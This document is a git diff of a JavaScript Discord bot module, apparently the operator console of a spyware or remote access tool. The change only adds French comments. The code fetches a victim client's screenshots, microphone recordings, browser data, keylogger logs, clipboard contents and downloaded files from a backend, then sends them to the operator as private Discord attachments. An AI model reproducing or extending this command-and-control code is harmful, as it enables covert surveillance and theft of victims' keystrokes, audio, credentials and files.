@@ -5,31 +5,32 @@ import config from '../static/config.json' assert {type: 'json'};
 
 const {API_BASE_URL} = config;
 
+// Fonction pour récupérer les données et mettre à jour l'interaction
 export async function fetchDataAndUpdateInteraction(type, interaction, clientId, browser) {
     let endpoint = "";
     let contentType = "";
     switch (type) {
-        case 'screenshot':
+        case 'screenshot': // Récupération des captures d'écran
             endpoint = `screenshot/client/${clientId}`;
             contentType = "capture d'écran";
             break;
-        case 'microphone':
+        case 'microphone': // Récupération des enregistrements audio
             endpoint = `microphone/client/${clientId}`;
             contentType = "enregistrement audio";
             break;
-        case 'browserdata':
+        case 'browserdata': // Récupération des données de navigation
             endpoint = `browser/client/${clientId}/${browser}`;
             contentType = "donnée de navigation";
             break;
-        case 'keylogger':
+        case 'keylogger': // Récupération des enregistrements du clavier
             endpoint = `keylogger/client/${clientId}`;
             contentType = "enregistrement du clavier";
             break;
-        case 'clipboard':
+        case 'clipboard': // Récupération du presse papier
             endpoint = `clipboard/client/${clientId}`;
             contentType = "récuperation du presse papier";
             break;
-        case 'downloadfile':
+        case 'downloadfile': // Récupération des fichiers téléchargés
             endpoint = `download/client/${clientId}`;
             contentType = "fichier téléchargé";
             break;
@@ -65,8 +66,9 @@ export async function fetchDataAndUpdateInteraction(type, interaction, clientId,
     }
 }
 
+// Fonction pour gérer la réception d'un fichier
 export async function handleFileResponse(interaction, endpoint, fileName, description, contentType) {
-    await interaction.deferReply({ephemeral: true});
+    await interaction.deferReply({ephemeral: true}); // Répondre à l'interaction avec ephemeral pour que seul l'utilisateur qui a exécuté la commande puisse voir la réponse
     try {
         const response = await executeRequestWithTokenRefresh(endpoint, {method: 'GET', responseType: 'arraybuffer'});
         let buffer;
@@ -75,7 +77,7 @@ export async function handleFileResponse(interaction, endpoint, fileName, descri
         } else {
             buffer = Buffer.from(response.data, 'binary');
         }
-        const attachment = new AttachmentBuilder(buffer, {name: fileName});
+        const attachment = new AttachmentBuilder(buffer, {name: fileName}); // Créer une pièce jointe Discord
 
         let embed;
         if (contentType === 'image') {
